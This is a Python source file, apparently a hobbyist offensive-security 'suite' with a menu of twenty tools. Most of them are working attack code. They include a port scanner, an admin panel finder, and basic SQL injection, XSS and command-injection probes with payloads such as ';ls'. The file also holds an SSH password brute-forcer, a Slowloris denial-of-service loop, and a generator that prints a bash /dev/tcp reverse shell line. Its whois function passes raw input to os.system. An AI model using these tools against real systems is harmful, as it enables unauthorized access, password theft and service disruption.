# Rayan (Abu_Jaber) - v5.0 (The Ultimate Suite - 20 Tools)
# Author: Rayan (Abu_Jaber)
# Stable version with 20 tools.

import os
import sys
import subprocess
import socket
import time
import base64
import random

# --- Smart Dependency Checker and Installer ---
def install_and_import(package, import_name=None):
    if import_name is None: import_name = package
    try:
        globals()[import_name] = __import__(import_name)
    except ImportError:
        print(f"\033[1;33m[~] Dependency '{package}' not found. Installing...\033[0m")
        try:
            if package == 'Pillow':
                subprocess.check_call(['pkg', 'install', 'libjpeg-turbo', '-y'])
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
            print(f"\033[1;32m[+] '{package}' installed. Please restart the script.\033[0m")
            sys.exit()
        except Exception as e:
            print(f"\033[1;31m[!] Failed to install '{package}'. Error: {e}\033[0m")
            sys.exit(1)

required_pip_packages = {'requests': 'requests', 'beautifulsoup4': 'bs4', 'Pillow': 'PIL', 'paramiko': 'paramiko'}
for package, name in required_pip_packages.items(): install_and_import(package, name)

from bs4 import BeautifulSoup
from PIL import Image, ExifTags
import requests
import paramiko

R, G, B, Y, C, W = "\033[1;31m", "\033[1;32m", "\033[1;34m", "\033[1;33m", "\033[1;36m", "\033[0m"

def coming_soon():
    print(f"\n{R}[!] This feature is theoretical and not implemented yet.{W}")

def banner():
    print(f"""
{Y}
                  ...
                 ;::::;
               ;::::; :;
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO\\
           ::::::;       ;          OOOOO\\
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:::`:::::::`;; ;:::::::::##                OO
     `:::`::::::::;;::::::::;:::#                OO
      `:::`::::::::;;:::::: ;::::::#              O
       `:::`:::::::::'; ;  :::::::::#             O
        `:::`::::::::: ;   ::::::::::#
         `:::`:::::::::  ,:::::::::::#
          `:::`:::::::::;::::::::;::;
           `:::`::::::::#`::::::'
             `:::`::::'#`::'
               `:::`'
{G}
        #########################################
        #                                       #
        # {R}     TOOL: Rayan (Abu_Jaber)           {G}#
        # {R}     AUTHOR: Rayan (Abu_Jaber)         {G}#
        # {R}     Version: 5.0 (The Ultimate Suite) {G}#
        #                                       #
        #########################################
{W}
""")

def menu():
    print("\n" + "="*10 + " Reconnaissance & Information Gathering " + "="*10)
    print("1. IP Scanner (Port Scanner)")
    print("2. Vulnerability Scanner (Banner/Header Grabbing)")
    print("3. Information Gathering (Whois)")
    print("4. Subdomain Finder")
    print("5. Admin Panel Finder")
    print("6. Link Extractor")
    print("7. Web Tech Scanner")
    print("8. Image Metadata Extractor")
    print("\n" + "="*10 + " Vulnerability Scanning & Analysis " + "="*12)
    print("9. SQL Injection Scanner (Basic)")
    print("10. XSS Scanner (Basic)")
    print("11. Command Injection Scanner (Basic)")
    print("12. Security Headers Scanner")
    print("\n" + "="*18 + " Exploitation & Attacks " + "="*18)
    print("13. Brute-force Attack (SSH)")
    print("14. FTP Brute-force")
    print("15. DoS Attack (Slowloris)")
    print("16. Reverse Shell Generator")
    print("\n" + "="*13 + " Utilities & Post-Exploitation " + "="*14)
    print("17. Custom Wordlist Generator")
    print("18. Encoder/Decoder (Base64)")
    print("19. Post-Exploitation Automation (Theoretical)")
    print("20. File Uploader/Downloader (Theoretical)")
    print("\n" + "="*23 + " System " + "="*24)
    print("99. Exit")

def port_scanner():
    target_ip = input(f"\n{Y}[~] Enter Target IP: {W}")
    print(f"\n{B}[*] Scanning {target_ip}...{W}")
    open_ports = []
    for port in range(1, 1025):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(0.1)
        if s.connect_ex((target_ip, port)) == 0: open_ports.append(port)
        s.close()
    if open_ports:
        print(f"\n{G}[+] Open ports found: {open_ports}{W}")
    else:
        print(f"\n{R}[-] No open ports found.{W}")

def vuln_scanner():
    target_ip = input(f"\n{Y}[~] Enter Target IP: {W}")
    port = int(input(f"{Y}[~] Enter Port: {W}"))
    try:
        s = socket.socket()
        s.connect((target_ip, port))
        banner = s.recv(1024).decode(errors='ignore')
        print(f"\n{G}[+] Banner: {banner.strip()}{W}")
    except Exception as e:
        print(f"\n{R}[!] Error: {e}{W}")

def info_gathering():
    domain = input(f"\n{Y}[~] Enter domain: {W}")
    os.system(f"whois {domain}")

def subdomain_finder():
    domain = input(f"\n{Y}[~] Enter domain: {W}")
    wordlist = ["www", "mail", "ftp", "admin", "test", "dev"]
    for sub in wordlist:
        try:
            host = f"{sub}.{domain}"
            ip = socket.gethostbyname(host)
            print(f"{G}[+] Found: {host} -> {ip}{W}")
        except socket.gaierror:
            pass

def admin_panel_finder():
    url = input(f"\n{Y}[~] Enter URL: {W}")
    paths = ["/admin", "/administrator", "/login", "/wp-admin"]
    for path in paths:
        try:
            response = requests.get(url + path, timeout=3)
            if response.status_code == 200:
                print(f"{G}[+] Found: {url+path}{W}")
        except requests.ConnectionError:
            print(f"{R}[!] Connection error.{W}")
            break

def link_extractor():
    url = input(f"\n{Y}[~] Enter URL: {W}")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    for link in soup.find_all('a'):
        print(link.get('href'))

def web_tech_scanner():
    url = input(f"\n{Y}[~] Enter URL: {W}")
    response = requests.get(url)
    headers = response.headers
    if 'Server' in headers:
        print(f"{G}[+] Server: {headers['Server']}{W}")
    if 'X-Powered-By' in headers:
        print(f"{G}[+] Powered by: {headers['X-Powered-By']}{W}")

def image_metadata_extractor():
    image_path = input(f"\n{Y}[~] Enter image URL or local path: {W}")
    try:
        if image_path.startswith('http'):
            response = requests.get(image_path, stream=True)
            img = Image.open(response.raw)
        else:
            img = Image.open(image_path)
        exif_data = img._getexif()
        if exif_data:
            for tag_id, value in exif_data.items():
                tag = ExifTags.TAGS.get(tag_id, tag_id)
                print(f"{G}{tag}: {value}{W}")
        else:
            print(f"{R}[-] No EXIF data found.{W}")
    except Exception as e:
        print(f"{R}[!] Error: {e}{W}")

def sql_injection_scanner():
    url = input(f"\n{Y}[~] Enter URL with parameter (e.g., http://site.com/page.php?id=1): {W}")
    payload = "'"
    try:
        response = requests.get(url + payload)
        if "sql" in response.text.lower() or "syntax" in response.text.lower():
            print(f"{G}[+] Vulnerable to SQL Injection.{W}")
        else:
            print(f"{R}[-] Not likely vulnerable.{W}")
    except Exception as e:
        print(f"{R}[!] Error: {e}{W}")

def xss_scanner():
    url = input(f"\n{Y}[~] Enter URL with parameter (e.g., http://site.com/search.php?q=): {W}")
    payload = "<script>alert('xss')</script>"
    try:
        response = requests.get(url + payload)
        if payload in response.text:
            print(f"{G}[+] Potentially vulnerable to XSS.{W}")
        else:
            print(f"{R}[-] Not likely vulnerable.{W}")
    except Exception as e:
        print(f"{R}[!] Error: {e}{W}")

def command_injection_scanner():
    url = input(f"\n{Y}[~] Enter URL with parameter (e.g., http://site.com/ping.php?host=127.0.0.1): {W}")
    payload = ";ls"
    try:
        response = requests.get(url + payload)
        # This is a very basic check
        if "total" in response.text and "drwx" in response.text:
            print(f"{G}[+] Potentially vulnerable to Command Injection.{W}")
        else:
            print(f"{R}[-] Not likely vulnerable.{W}")
    except Exception as e:
        print(f"{R}[!] Error: {e}{W}")

def security_headers_scanner():
    url = input(f"\n{Y}[~] Enter URL: {W}")
    response = requests.get(url)
    headers = response.headers
    missing = []
    if 'Strict-Transport-Security' not in headers: missing.append('HSTS')
    if 'Content-Security-Policy' not in headers: missing.append('CSP')
    if 'X-Frame-Options' not in headers: missing.append('X-Frame-Options')
    if missing:
        print(f"{R}[-] Missing security headers: {', '.join(missing)}{W}")
    else:
        print(f"{G}[+] All basic security headers are present.{W}")

def brute_force_ssh():
    host = input(f"\n{Y}[~] Enter host IP: {W}")
    user = input(f"{Y}[~] Enter username: {W}")
    wordlist = input(f"{Y}[~] Enter wordlist path: {W}")
    with open(wordlist, 'r') as f:
        for line in f:
            password = line.strip()
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(host, username=user, password=password, timeout=3)
                print(f"{G}[+] Success! Password: {password}{W}")
                client.close()
                return
            except paramiko.AuthenticationException:
                print(f"{R}[-] Failed: {password}{W}")
                client.close()
            except Exception as e:
                print(f"{R}[!] Connection error: {e}{W}")
                client.close()
                return

def ftp_brute_force():
    coming_soon() # Placeholder

def dos_attack():
    target = input(f"\n{Y}[~] Enter target IP: {W}")
    port = int(input(f"{Y}[~] Enter port: {W}"))
    num_sockets = 100
    sockets = []
    print(f"{B}[*] Starting Slowloris attack...{W}")
    for _ in range(num_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            sockets.append(s)
        except Exception as e:
            print(f"{R}[!] Failed to create socket: {e}{W}")
    try:
        while True:
            for s in sockets:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            time.sleep(10)
    except KeyboardInterrupt:
        print(f"{G}[+] Attack stopped.{W}")
        for s in sockets:
            s.close()

def reverse_shell_generator():
    lhost = input(f"\n{Y}[~] Enter LHOST: {W}")
    lport = input(f"{Y}[~] Enter LPORT: {W}")
    print(f"\n{C}Bash: bash -i >& /dev/tcp/{lhost}/{lport} 0>&1{W}")

def custom_wordlist_generator():
    words = input(f"\n{Y}[~] Enter keywords separated by comma: {W}").split(',')
    filename = "custom_list.txt"
    with open(filename, 'w') as f:
        for word in words:
            f.write(word.strip() + '\n')
    print(f"{G}[+] Wordlist saved to {filename}{W}")

def encoder_decoder():
    op = input(f"\n{Y}[~] (1) Encode or (2) Decode? {W}")
    text = input(f"{Y}[~] Enter text: {W}")
    if op == '1':
        print(f"{G}Encoded: {base64.b64encode(text.encode()).decode()}{W}")
    elif op == '2':
        print(f"{G}Decoded: {base64.b64decode(text.encode()).decode()}{W}")

def main():
    tool_functions = {
        '1': port_scanner, '2': vuln_scanner, '3': info_gathering, '4': subdomain_finder,
        '5': admin_panel_finder, '6': link_extractor, '7': web_tech_scanner, '8': image_metadata_extractor,
        '9': sql_injection_scanner, '10': xss_scanner, '11': command_injection_scanner, '12': security_headers_scanner,
        '13': brute_force_ssh, '14': ftp_brute_force, '15': dos_attack, '16': reverse_shell_generator,
        '17': custom_wordlist_generator, '18': encoder_decoder, '19': coming_soon, '20': coming_soon
    }
    banner()
    while True:
        menu()
        try:
            choice = input(f"\n{Y}>> Enter your choice: {W}")
            if choice == '99':
                print(f"\n{G}Exiting. Goodbye!{W}")
                break
            action = tool_functions.get(choice)
            if action:
                action()
            else:
                print(f"\n{R}[!] Invalid choice.{W}")
        except KeyboardInterrupt:
            print(f"\n\n{G}Exiting. Goodbye!{W}")
            break
        except Exception as e:
            print(f"\n{R}[!] An unexpected error occurred: {e}{W}")

if __name__ == "__main__":
    main()

